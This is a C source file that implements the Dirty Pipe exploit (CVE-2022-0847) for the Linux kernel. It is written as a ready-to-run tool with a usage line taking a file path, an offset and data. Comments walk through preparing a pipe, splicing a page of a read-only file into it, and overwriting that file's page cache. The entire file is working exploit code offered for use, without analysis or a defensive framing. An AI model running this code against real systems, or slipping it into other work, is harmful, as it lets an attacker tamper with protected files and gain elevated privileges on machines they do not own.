#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// Dirty Pipe exploit - CVE-2022-0847
// Overwrites page cache of a read-only file

static void prepare_pipe(int p[2])
{
    if (pipe(p)) {
        perror("pipe");
        exit(1);
    }

    // Fill the pipe so the PIPE_BUF_FLAG_CAN_MERGE flag is set
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    // Write enough to fill the entire pipe buffer
    for (unsigned r = pipe_size; r > 0; ) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        if (write(p[1], buffer, n) < 0) {
            perror("write pipe");
            exit(1);
        }
        r -= n;
    }

    // Drain it so PIPE_BUF_FLAG_CAN_MERGE is set on all pages
    for (unsigned r = pipe_size; r > 0; ) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        if (read(p[0], buffer, n) < 0) {
            perror("read pipe");
            exit(1);
        }
        r -= n;
    }
}

int main(int argc, char **argv)
{
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <file> <offset> <data>\n", argv[0]);
        return 1;
    }

    const char *path = argv[1];
    uint64_t offset = strtoull(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    // Open the target file read-only
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open file");
        return 1;
    }

    struct stat st;
    if (fstat(fd, &st)) {
        perror("fstat");
        return 1;
    }

    // offset must be > 0 and within file
    if (offset == 0) {
        fprintf(stderr, "Offset must be > 0\n");
        return 1;
    }

    if (offset + data_size > (size_t)st.st_size) {
        fprintf(stderr, "Data extends beyond file size\n");
        return 1;
    }

    int p[2];
    prepare_pipe(p);

    // The trick: splice from the file at the given offset
    // This brings the page into the pipe with PIPE_BUF_FLAG_CAN_MERGE set
    --offset;
    const off_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const off_t end_offset = (off_t)(offset + data_size);

    if (end_offset > next_page) {
        fprintf(stderr, "Write crosses page boundary, not supported in this simple version\n");
        // For simplicity, just do first page
    }

    // Splice 1 byte to get the page into the pipe
    ssize_t nbytes = splice(fd, &(off_t){offset}, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice");
        return 1;
    }
    if (nbytes == 0) {
        fprintf(stderr, "short splice\n");
        return 1;
    }

    // Now write our data - it will go into the page cache!
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("write data");
        return 1;
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "short write: %zd\n", nbytes);
        return 1;
    }

    printf("Success! Wrote %zd bytes to %s at offset %llu\n", nbytes, path, (unsigned long long)(offset + 1));
    close(fd);
    close(p[0]);
    close(p[1]);
    return 0;
}
